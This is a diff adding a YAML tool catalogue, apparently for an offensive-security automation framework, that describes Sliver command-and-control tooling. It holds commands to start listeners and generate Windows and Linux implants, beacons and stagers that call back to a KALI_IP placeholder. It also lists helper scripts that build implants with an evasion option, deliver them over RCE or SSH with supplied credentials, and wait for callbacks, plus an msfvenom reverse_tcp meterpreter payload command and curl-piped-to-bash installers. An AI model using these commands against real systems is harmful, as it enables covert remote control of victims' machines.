@@ -1,0 +1,55 @@
+sliver:
+  description: "Sliver C2 server — generates implants, manages listeners/sessions"
+  category: c2
+  install_cmd: "apt-get install -y sliver || (curl -sL https://sliver.sh/install | bash)"
+  verify_cmd: "sliver version"
+  examples:
+    - "sliver > mtls --lhost 0.0.0.0 --lport 8888"
+    - "sliver > generate --mtls KALI_IP:8888 --os windows --arch amd64 --save /tmp/implant.exe"
+    - "sliver > generate --mtls KALI_IP:8888 --os linux --arch amd64 --format elf --save /tmp/implant"
+    - "sliver > generate beacon --http KALI_IP:443 --os windows --seconds 30 --jitter 50 --save /tmp/beacon.exe"
+    - "sliver > generate --wg KALI_IP:53 --os linux --save /tmp/wg_implant"
+    - "sliver > generate stager --lhost KALI_IP --lport 8443 --protocol tcp --os windows --format raw --save /tmp/stager.bin"
+    - "sliver > sessions"
+    - "sliver > beacons"
+    - "sliver > use SESSION_ID"
+    - "sliver > jobs"
+
+sliver-client:
+  description: "Sliver client binary for remote operator connections"
+  category: c2
+  install_cmd: "apt-get install -y sliver-client || curl -sL https://sliver.sh/install | bash"
+  verify_cmd: "sliver-client version"
+  examples:
+    - "sliver-client --config /opt/sliver/configs/kali-operator.cfg"
+
+generate_implant:
+  description: "TazoSploit helper — generates Sliver implants with proper options"
+  category: c2
+  verify_cmd: "python3 /opt/tazosploit/scripts/generate_implant.py --help"
+  examples:
+    - "python3 /opt/tazosploit/scripts/generate_implant.py --os windows --arch amd64 --transport mtls --mode session --json"
+    - "python3 /opt/tazosploit/scripts/generate_implant.py --os linux --arch amd64 --transport https --mode beacon --json"
+    - "python3 /opt/tazosploit/scripts/generate_implant.py --os windows --arch amd64 --format shellcode --evasion --json"
+
+deliver_payload:
+  description: "TazoSploit helper — generates delivery commands for implants"
+  category: c2
+  verify_cmd: "python3 /opt/tazosploit/scripts/deliver_payload.py --help"
+  examples:
+    - "python3 /opt/tazosploit/scripts/deliver_payload.py --access-type rce --implant /tmp/implant.exe --target-os windows --kali-ip KALI_IP --json"
+    - "python3 /opt/tazosploit/scripts/deliver_payload.py --access-type ssh --implant /tmp/implant --target-os linux --target TARGET_IP --creds 'user:pass' --json"
+
+verify_callback:
+  description: "TazoSploit helper — waits for and verifies C2 callbacks"
+  category: c2
+  verify_cmd: "python3 /opt/tazosploit/scripts/verify_callback.py --help"
+  examples:
+    - "python3 /opt/tazosploit/scripts/verify_callback.py --target TARGET_IP --mode session --timeout 120 --json"
+
+msfvenom:
+  description: "Metasploit payload generator (alternative to Sliver for some scenarios)"
+  category: exploitation
+  verify_cmd: "msfvenom --list formats | head -5"
+  examples:
+    - "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o /tmp/payload.exe"
